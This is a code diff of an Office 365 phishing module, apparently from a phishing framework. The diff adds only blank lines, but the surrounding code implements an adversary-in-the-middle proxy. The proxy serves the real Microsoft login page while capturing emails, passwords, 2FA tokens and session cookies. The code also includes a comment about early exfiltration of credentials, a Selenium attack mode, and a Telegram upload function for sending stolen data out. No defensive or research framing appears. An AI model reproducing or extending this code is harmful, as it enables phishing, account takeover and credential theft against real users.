@@ -11,7 +11,9 @@ from selenium.webdriver.common.by import By
 from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.chrome.service import Service
 from webdriver_manager.chrome import ChromeDriverManager
+
 import os, traceback, shutil, datetime, threading, time
+
 
 class Office365Module(BaseModule):
     def __init__(self, enable_2fa=False, use_aitm_proxy=True):
@@ -24,8 +26,10 @@ class Office365Module(BaseModule):
         self.add_route('twofactor', '/twofactor')
         self.add_route('redirect', '/redirect')
         # AiTM proxy routes
+
         self.add_route('proxy_endpoint', '/proxy')
         self.add_route('proxy_catch_all', '/proxy/<path:path>')
+
         self.add_route('aitm_status', '/aitm/status')
         self.add_route('aitm_start', '/aitm/start')
         self.add_route('aitm_results', '/aitm/results')
@@ -36,9 +40,11 @@ class Office365Module(BaseModule):
         self.aitm_proxy_url = None
         self.attack_mode = "aitm"  # "aitm" or "selenium"
 
+
     def log(self, message):
         """Logging method for debugging"""
         print(f"[Office365Module] {message}")
+
 
     def login(self):
         template = self.env.get_template('login.html')
@@ -81,6 +87,7 @@ class Office365Module(BaseModule):
         self.user = request.values.get('email')
         self.captured_password = request.values.get('password')
         self.two_factor_token = request.values.get('two_factor_token')
+
 
         # Send early exfiltration of credentials
         ip = request.remote_addr
@@ -142,10 +149,12 @@ class Office365Module(BaseModule):
                 
                 while time.time() - start_time < timeout:
                     time.sleep(10)  # Check every 10 seconds
+
                     
                     # Get captured data from proxy
                     captured_data = self.aitm_manager.get_attack_results()
                     
+
                     # Check if we captured anything
                     if captured_data.get('cookies') or captured_data.get('credentials') or captured_data.get('session_info', {}).get('auth_success'):
                         # We got something! Validate and send results
@@ -183,6 +192,7 @@ class Office365Module(BaseModule):
     def _handle_aitm_attack(self):
         """Legacy method - replaced by _start_proxy_and_redirect_victim"""
         return self._start_proxy_and_redirect_victim()
+
 
     def _handle_selenium_attack(self):
         """Handle Selenium-based attack (original method)"""
@@ -373,6 +383,7 @@ class Office365Module(BaseModule):
                 return json.dumps({'error': 'No active AiTM proxy'})
         except Exception as e:
             return json.dumps({'error': str(e)})
+
 
     def proxy_endpoint(self):
         """AiTM Proxy endpoint - serves real Microsoft login while capturing traffic"""
@@ -618,6 +629,7 @@ class Office365Module(BaseModule):
                 
         except Exception as e:
             self.log(f"Error validating session: {e}")
+
 
     def send_telegram(self, message: str | None = None, document_paths: list | None = None):
         """Send a Markdown message and/or upload documents to Telegram.
